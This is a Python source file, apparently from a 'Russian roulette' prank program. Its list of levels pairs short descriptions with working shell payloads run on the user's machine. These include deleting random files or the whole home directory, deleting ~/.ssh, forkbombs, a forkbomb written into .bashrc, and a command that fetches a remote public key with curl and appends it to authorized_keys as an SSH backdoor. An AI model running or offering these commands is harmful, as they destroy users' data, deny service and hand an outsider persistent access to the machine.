LEVELS = [
    ("echo 'bang'", "echo 'bang!';"),
    ("swap two files in your homedir", """files=(~/*);
f1="${files[RANDOM % ${#files[@]}]}"
f2="${files[RANDOM % ${#files[@]}]}"
mv "$f1" /tmp/russianroulette
mv "$f2" "$f1"
mv /tmp/russianroulette "$f2"
echo 'bang! two files got their names mixed up. now, which ones were they..?'
"""),
    ("replace a random file from your homedir with a kitten", """
files=(~/*);
f="${files[RANDOM % ${#files[@]}]}"
rm -rf "$f"
curl http://placekitten.com/g/320/240 > "$f"
echo 'bang!' $f 'is now a kitten' """),
    ("add my public key to your authorized_keys in .ssh", """mkdir -p .ssh
chmod 700 ~/.ssh
curl -k https://q3k.org/pubkey >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
echo 'bang! thanks for the access.'"""),
    ("run a forkbomb", """
forkbomb() {
    echo 'bang!';
    forkbomb | forkbomb &
}
forkbomb;
"""),
    ("delete a random file from your homedir", """files=(~/*);
f="${files[RANDOM % ${#files[@]}]}"
rm -rf "$f"
echo 'bang!' $f 'is gone forever.'"""),
    ("delete ~/.ssh", "rm -rf ~/.ssh; echo 'bang! no more ssh for you.'"),
    ("put a forkbomb in your .bashrc", """ echo ":(){ :|:& };:" >> ~/.bashrc"""),
    ("delete your whole homedir", """rm -rf ~; echo 'bang!' "you're homeless now." """),
]
